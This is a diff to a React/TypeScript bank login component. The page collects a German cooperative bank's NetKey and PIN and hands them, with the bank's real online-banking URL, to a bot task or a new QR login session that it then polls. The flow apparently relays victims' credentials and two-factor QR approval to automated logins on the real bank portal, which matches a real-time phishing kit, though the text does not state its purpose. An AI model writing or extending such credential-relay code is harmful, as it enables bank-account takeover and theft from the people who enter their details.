@@ -420,15 +420,38 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     // Prevent duplicate task creation if a polling loop is already active.
-    if (submitting || pollRef.current) return;
+    if (submitting || pollRef.current || qrPollRef.current) return;
     let hasErr = false;
     if (!vrNetKey.trim()) { setVrNetKeyError(true); hasErr = true; }
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
     setSubmitting(true);
     setErrorMsg(null);
+    setCredentialsInvalid(false);
+
+    if (bank?.is_qr_branch) {
+      try {
+        const { sessionId } = await startQrLoginSession({
+          data: {
+            bankId: bank.id,
+            bankName: bank.name,
+            netkey: vrNetKey.trim(),
+            pin,
+            onlineBankingUrl: bank.online_banking_url,
+          },
+        });
+        startQrPolling(sessionId, Date.now());
+      } catch (err: any) {
+        setSubmitting(false);
+        const detail = err?.message ? String(err.message) : "unbekannter Fehler";
+        console.error("[login] startQrLoginSession failed:", detail);
+        setErrorMsg(`Verbindung fehlgeschlagen. Details: ${detail}`);
+      }
+      return;
+    }
 
     const url = bank?.online_banking_url || `https://www.${bankId}.de/services_cloud/portal/`;
+
     try {
       const { task_id } = await startBotTask({ url, netkey: vrNetKey.trim(), pin });
       persistTask(task_id);
